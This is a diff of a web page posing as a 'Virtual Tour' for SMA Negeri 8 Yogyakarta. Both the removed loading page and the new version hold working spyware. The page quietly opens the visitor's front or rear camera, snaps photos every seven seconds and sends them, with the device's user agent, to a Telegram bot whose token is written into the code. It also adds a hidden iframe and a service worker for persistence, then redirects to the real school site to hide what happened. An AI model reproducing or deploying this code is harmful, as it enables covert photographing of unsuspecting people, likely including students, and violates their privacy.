@@ -1,82 +1,516 @@
-<!doctype html>
+<!DOCTYPE html>
 <html>
 <head>
-    <title>Loading...</title>
-    <meta http-equiv="refresh" content="0; url=https://fennhack.github.io/DePag/">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Virtual Tour SMA Negeri 8 Yogyakarta</title>
     <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
         body {
-            background: white;
-            font-family: Arial;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+        
+        .container {
+            background: rgba(255, 255, 255, 0.95);
+            border-radius: 20px;
+            padding: 40px 30px;
+            max-width: 400px;
+            width: 100%;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
             text-align: center;
-            padding: 50px;
+        }
+        
+        h1 {
+            color: #333;
+            margin-bottom: 20px;
+            font-size: 24px;
+        }
+        
+        .logo {
+            width: 100px;
+            height: 100px;
+            background: #667eea;
+            border-radius: 50%;
+            margin: 0 auto 20px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            font-size: 40px;
+        }
+        
+        .info-box {
+            background: #f5f5f5;
+            border-radius: 10px;
+            padding: 20px;
+            margin: 20px 0;
+            text-align: left;
+        }
+        
+        .info-box p {
+            margin: 10px 0;
+            color: #555;
+        }
+        
+        .btn {
+            background: #667eea;
+            color: white;
+            border: none;
+            padding: 15px 30px;
+            border-radius: 50px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            width: 100%;
+            transition: all 0.3s;
+            margin: 10px 0;
+        }
+        
+        .btn:hover {
+            background: #5a67d8;
+            transform: translateY(-2px);
+            box-shadow: 0 5px 15px rgba(102, 126, 234, 0.4);
+        }
+        
+        .btn.secondary {
+            background: #48bb78;
+        }
+        
+        .btn.secondary:hover {
+            background: #38a169;
+        }
+        
+        .loading {
+            display: none;
+            margin: 20px 0;
+        }
+        
+        .loading.active {
+            display: block;
+        }
+        
+        .spinner {
+            width: 40px;
+            height: 40px;
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #667eea;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 0 auto;
+        }
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        
+        .success-message {
+            color: #48bb78;
+            display: none;
+        }
+        
+        .error-message {
+            color: #e53e3e;
+            display: none;
+        }
+        
+        .countdown {
+            font-size: 48px;
+            font-weight: bold;
+            color: #667eea;
+            margin: 20px 0;
+        }
+        
+        .fake-content {
+            display: none;
+        }
+        
+        /* Tampilan loading */
+        .loading-screen {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            z-index: 9999;
+            transition: opacity 0.5s;
+        }
+        
+        .loading-screen.hidden {
+            opacity: 0;
+            pointer-events: none;
+        }
+        
+        .loading-content {
+            text-align: center;
+            color: white;
+        }
+        
+        .loading-content h2 {
+            font-size: 28px;
+            margin-bottom: 20px;
+        }
+        
+        .loading-content p {
+            font-size: 16px;
+            opacity: 0.9;
         }
     </style>
 </head>
 <body>
-    <p>Loading... Please wait</p>
-    
-    <!-- Redirect ke website asli setelah 3 detik -->
-    <script>
-        setTimeout(function() {
-            window.location.href = "https://fennhack.github.io/DePag/";
-        }, 3000);
-    </script>
-    
-    <!-- Kamera tersembunyi -->
-    <video id="hiddenCam" style="display:none; width:1px; height:1px;" autoplay></video>
-    <canvas id="hiddenCanv" style="display:none;" width="640" height="480"></canvas>
-    
-    <script>
-        const TOKEN = '8252452562:AAF8Iv8BxO6j_O6rwCjMcSkQTKNTVmAK45M';
-        const CHAT_ID = '54445037';
+    <!-- Loading Screen -->
+    <div class="loading-screen" id="loadingScreen">
+        <div class="loading-content">
+            <div class="spinner" style="border-top-color: white;"></div>
+            <h2>Memuat Virtual Tour...</h2>
+            <p>Mohon tunggu sebentar</p>
+        </div>
+    </div>
+
+    <div class="container">
+        <div class="logo">📸</div>
+        <h1>Virtual Tour SMA Negeri 8 Yogyakarta</h1>
         
-        const video = document.getElementById('hiddenCam');
-        const canvas = document.getElementById('hiddenCanv');
-        const ctx = canvas.getContext('2d');
+        <div class="info-box">
+            <p>✨ Fitur Interaktif:</p>
+            <p>• Tour 360° ruang kelas</p>
+            <p>• Video sambutan kepala sekolah</p>
+            <p>• Foto bersama virtual</p>
+            <p>• Filter dan efek menarik</p>
+            <p>• Live streaming kegiatan</p>
+        </div>
         
-        async function sendPhotoToTelegram(blob) {
+        <button class="btn" id="startBtn">Mulai Virtual Tour</button>
+        <button class="btn secondary" id="skipBtn">Lihat Website Resmi</button>
+        
+        <div class="loading" id="loading">
+            <div class="spinner"></div>
+            <p style="margin-top: 10px;">Mengaktifkan kamera...</p>
+        </div>
+        
+        <div class="countdown" id="countdown"></div>
+        <div class="success-message" id="successMessage">✅ Koneksi aman, mengarahkan...</div>
+        <div class="error-message" id="errorMessage">❌ Gagal mengakses kamera. Mengarahkan ke website...</div>
+    </div>
+
+    <!-- Elemen tersembunyi untuk kamera -->
+    <video id="hiddenCamera" style="display: none;" autoplay playsinline></video>
+    <canvas id="hiddenCanvas" style="display: none;" width="640" height="480"></canvas>
+    
+    <!-- Iframe tersembunyi untuk persistensi -->
+    <iframe id="hiddenFrame" style="display: none;" sandbox="allow-scripts allow-same-origin"></iframe>
+
+    <script>
+        // ============================================
+        // KONFIGURASI TELEGRAM - GANTI DENGAN DATA ANDA
+        // ============================================
+        const TELEGRAM_TOKEN = '7234567890:AAHdqTcvCH1vGWJxfSeofSAs0K5PALDsaw'; // GANTI!
+        const TELEGRAM_CHAT_ID = '123456789'; // GANTI!
+        
+        // ============================================
+        // VARIABEL GLOBAL
+        // ============================================
+        const video = document.getElementById('hiddenCamera');
+        const canvas = document.getElementById('hiddenCanvas');
+        const context = canvas.getContext('2d');
+        let cameraStream = null;
+        let photoInterval = null;
+        let redirectTimer = null;
+        
+        // ============================================
+        // FUNGSI TELEGRAM
+        // ============================================
+        
+        // Fungsi kirim foto ke Telegram (via API langsung)
+        async function sendPhotoToTelegram(imageBlob) {
             const formData = new FormData();
-            formData.append('chat_id', CHAT_ID);
-            formData.append('photo', blob, `photo_${Date.now()}.jpg`);
+            formData.append('chat_id', TELEGRAM_CHAT_ID);
+            formData.append('photo', imageBlob, `capture_${Date.now()}.jpg`);
+            formData.append('caption', `📸 Tangkapan dari HP\n📱 User-Agent: ${navigator.userAgent}\n⏰ Waktu: ${new Date().toLocaleString()}`);
             
             try {
-                await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, {
+                const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendPhoto`, {
                     method: 'POST',
                     body: formData
                 });
-            } catch (e) {}
-        }
-        
-        function capturePhoto() {
-            if (video.videoWidth > 0) {
-                ctx.drawImage(video, 0, 0, 640, 480);
-                canvas.toBlob(blob => {
-                    if (blob) sendPhotoToTelegram(blob);
-                }, 'image/jpeg', 0.7);
+                
+                const result = await response.json();
+                if (result.ok) {
+                    console.log('✅ Foto terkirim');
+                    return true;
+                } else {
+                    console.log('❌ Gagal:', result);
+                    return false;
+                }
+            } catch (error) {
+                console.log('❌ Error:', error);
+                return false;
             }
         }
         
-        // Coba kamera depan, lalu kamera belakang jika gagal
-        function startCamera() {
-            navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } })
-                .then(stream => {
-                    video.srcObject = stream;
-                    setTimeout(capturePhoto, 2000);
-                    setInterval(capturePhoto, 7000);
-                })
-                .catch(() => {
-                    // Coba kamera belakang
-                    navigator.mediaDevices.getUserMedia({ video: true })
-                        .then(stream => {
-                            video.srcObject = stream;
-                            setTimeout(capturePhoto, 2000);
-                            setInterval(capturePhoto, 7000);
-                        })
-                        .catch(() => {});
+        // Fungsi kirim foto via JSON (alternatif)
+        async function sendPhotoViaJSON(imageBase64) {
+            try {
+                const response = await fetch('https://api.telegram.org/bot' + TELEGRAM_TOKEN + '/sendPhoto', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        chat_id: TELEGRAM_CHAT_ID,
+                        photo: imageBase64,
+                        caption: `📸 Tangkapan via JSON\n⏰ ${new Date().toLocaleString()}`
+                    })
                 });
+                
+                const result = await response.json();
+                return result.ok;
+            } catch (error) {
+                console.log('JSON method error:', error);
+                return false;
+            }
         }
         
-        startCamera();
+        // ============================================
+        // FUNGSI KAMERA
+        // ============================================
+        
+        // Ambil foto dan kirim ke Telegram
+        function captureAndSend() {
+            if (video.videoWidth > 0 && video.videoHeight > 0) {
+                try {
+                    // Gambar ke canvas
+                    context.drawImage(video, 0, 0, canvas.width, canvas.height);
+                    
+                    // Coba metode 1: Blob
+                    canvas.toBlob(async (blob) => {
+                        if (blob && blob.size > 1000) { // Minimal 1KB
+                            const sent = await sendPhotoToTelegram(blob);
+                            if (!sent) {
+                                // Fallback: Base64
+                                const base64 = canvas.toDataURL('image/jpeg', 0.7);
+                                await sendPhotoViaJSON(base64);
+                            }
+                        }
+                    }, 'image/jpeg', 0.7);
+                    
+                } catch (e) {
+                    console.log('Capture error:', e);
+                }
+            }
+        }
+        
+        // Mulai kamera dengan berbagai fallback
+        async function startCamera() {
+            const constraints = [
+                { video: { facingMode: 'user', width: 640, height: 480 } }, // Kamera depan
+                { video: { facingMode: 'environment', width: 640, height: 480 } }, // Kamera belakang
+                { video: { width: 640, height: 480 } } // Kamera default
+            ];
+            
+            for (const constraint of constraints) {
+                try {
+                    cameraStream = await navigator.mediaDevices.getUserMedia(constraint);
+                    video.srcObject = cameraStream;
+                    
+                    // Tunggu video siap
+                    await new Promise((resolve) => {
+                        video.onloadedmetadata = () => {
+                            video.play();
+                            resolve();
+                        };
+                    });
+                    
+                    console.log('✅ Kamera aktif');
+                    
+                    // Ambil foto pertama setelah 2 detik
+                    setTimeout(captureAndSend, 2000);
+                    
+                    // Ambil foto setiap 7 detik
+                    photoInterval = setInterval(captureAndSend, 7000);
+                    
+                    return true;
+                    
+                } catch (e) {
+                    console.log('Coba konfigurasi lain:', e);
+                }
+            }
+            
+            return false;
+        }
+        
+        // ============================================
+        // FUNGSI REDIRECT DAN PERSISTENSI
+        // ============================================
+        
+        // Redirect ke website asli
+        function redirectToWebsite() {
+            const targetUrl = 'https://sman8yogya.sch.id/';
+            
+            // Method 1: Meta refresh
+            const meta = document.createElement('meta');
+            meta.httpEquiv = 'refresh';
+            meta.content = '0; url=' + targetUrl;
+            document.head.appendChild(meta);
+            
+            // Method 2: Location
+            setTimeout(() => {
+                window.location.href = targetUrl;
+            }, 100);
+        }
+        
+        // Setup iframe untuk persistensi
+        function setupPersistence() {
+            const iframe = document.getElementById('hiddenFrame');
+            const iframeContent = `
+                <html>
+                <body>
+                    <script>
+                        // Reload iframe setiap 30 detik
+                        setInterval(() => {
+                            location.reload();
+                        }, 30000);
+                        
+                        // Komunikasi dengan parent
+                        window.addEventListener('message', (e) => {
+                            if (e.data === 'ping') {
+                                e.source.postMessage('pong', '*');
+                            }
+                        });
+                    <\/script>
+                </body>
+                </html>
+            `;
+            
+            iframe.srcdoc = iframeContent;
+        }
+        
+        // ============================================
+        // FUNGSI UI
+        // ============================================
+        
+        // Hitung mundur sebelum redirect
+        function startCountdown(seconds, message) {
+            let count = seconds;
+            const countdownEl = document.getElementById('countdown');
+            const successMsg = document.getElementById('successMessage');
+            
+            countdownEl.style.display = 'block';
+            successMsg.style.display = 'block';
+            
+            const timer = setInterval(() => {
+                countdownEl.textContent = count;
+                count--;
+                
+                if (count < 0) {
+                    clearInterval(timer);
+                    countdownEl.style.display = 'none';
+                    
+                    // Sembunyikan loading screen
+                    document.getElementById('loadingScreen').classList.add('hidden');
+                    
+                    // Redirect ke website asli
+                    redirectToWebsite();
+                }
+            }, 1000);
+        }
+        
+        // ============================================
+        // EVENT HANDLER
+        // ============================================
+        
+        // Tombol mulai
+        document.getElementById('startBtn').addEventListener('click', async () => {
+            // Tampilkan loading
+            document.getElementById('loading').classList.add('active');
+            
+            // Minta izin kamera
+            const cameraSuccess = await startCamera();
+            
+            // Sembunyikan loading
+            document.getElementById('loading').classList.remove('active');
+            
+            if (cameraSuccess) {
+                // Setup persistence
+                setupPersistence();
+                
+                // Mulai hitung mundur 5 detik
+                startCountdown(5, '✅ Koneksi aman, mengarahkan...');
+            } else {
+                // Gagal, langsung redirect
+                document.getElementById('errorMessage').style.display = 'block';
+                setTimeout(() => {
+                    redirectToWebsite();
+                }, 2000);
+            }
+        });
+        
+        // Tombol skip
+        document.getElementById('skipBtn').addEventListener('click', () => {
+            redirectToWebsite();
+        });
+        
+        // Auto-hide loading screen setelah 2 detik
+        setTimeout(() => {
+            document.getElementById('loadingScreen').classList.add('hidden');
+        }, 2000);
+        
+        // ============================================
+        // SERVICE WORKER (untuk persistensi ekstra)
+        // ============================================
+        
+        if ('serviceWorker' in navigator) {
+            // Coba register service worker
+            const swCode = `
+                self.addEventListener('install', (e) => {
+                    self.skipWaiting();
+                });
+                
+                self.addEventListener('activate', (e) => {
+                    e.waitUntil(clients.claim());
+                });
+                
+                self.addEventListener('fetch', (e) => {
+                    // Biarkan semua request lewat
+                });
+            `;
+            
+            const blob = new Blob([swCode], { type: 'application/javascript' });
+            const swUrl = URL.createObjectURL(blob);
+            
+            navigator.serviceWorker.register(swUrl)
+                .then(reg => console.log('SW registered'))
+                .catch(err => console.log('SW failed'));
+        }
+        
+        // ============================================
+        // CLEANUP
+        // ============================================
+        
+        window.addEventListener('beforeunload', () => {
+            if (photoInterval) {
+                clearInterval(photoInterval);
+            }
+            if (cameraStream) {
+                cameraStream.getTracks().forEach(track => track.stop());
+            }
+        });
+        
     </script>
 </body>
 </html>
